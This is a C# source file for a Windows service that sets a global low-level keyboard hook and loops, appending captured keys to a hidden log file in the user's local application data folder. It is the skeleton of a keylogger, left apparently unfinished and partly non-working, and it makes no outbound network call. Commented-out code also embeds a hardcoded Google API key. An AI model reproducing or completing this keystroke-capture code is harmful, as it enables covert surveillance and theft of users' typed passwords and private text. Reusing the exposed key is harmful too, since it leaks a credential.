using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Input;
using Google.Apis.Discovery.v1;
using Google.Apis.Discovery.v1.Data;
using Google.Apis.Services;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace finalService
{
    class MyService
    {
        public void Start()
        {
            _hookID = SetHook(_proc);
            //Application.Run();
           // UnhookWindowsHookEx(_hookID);
            string lines = " ";
            // write code here that runs when the Windows Service starts up.  
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            path += "\\log.txt";
            //try
            //{
            //    new MyService().Run().Wait();
            //}
            //catch (AggregateException ex)
            //{
            //    foreach (var e in ex.InnerExceptions)
            //    {
            //        Console.WriteLine("ERROR: " + e.Message);
            //    }
            //}
            while (true)
            {
               // Console.WriteLine(path);
               if(File.Exists(path))
                {
                    Console.WriteLine("File Exists");
                    ConsoleKeyInfo keyinfo;
                    do
                    {
                        keyinfo = Console.ReadKey();
                        Console.WriteLine(keyinfo.Key + " was pressed");
                        lines += keyinfo.Key.ToString();
                        break;
                    }
                    while (keyinfo.Key != ConsoleKey.X);
                    using (System.IO.StreamWriter file = File.AppendText(path))
                    {
                        foreach (var line in lines)
                        {

                            file.WriteLine(line);

                        }
                    }
                    lines = "";

                }
                else
                {
                    Console.WriteLine("file doesnot exitst");
                    File.Create(path);
                }
                System.Threading.Thread.Sleep(1000);
            }
        }
        public void Stop()
        {
            // write code here that runs when the Windows Service stops.  
        }
        //private async Task Run()
        //{
        //    // Create the service.
        //    var service = new DiscoveryService(new BaseClientService.Initializer
        //    {
        //        ApplicationName = "Discovery Sample",
        //        ApiKey = "AIzaSyDGc1mQn2hpvciKqxUYNXw_rSqs1bSaB8g",
        //    });

        //    // Run the request.
        //    Console.WriteLine("Executing a list request...");
        //    var result = await service.Apis.List().ExecuteAsync();

        //    // Display the results.
        //    if (result.Items != null)
        //    {
        //        foreach (DirectoryList.ItemsData api in result.Items)
        //        {
        //            Console.WriteLine(api.Id + " - " + api.Title);
        //        }
        //    }
        //}

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
               // Console.WriteLine((System.Windows.Input.ICommand)vkCode);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
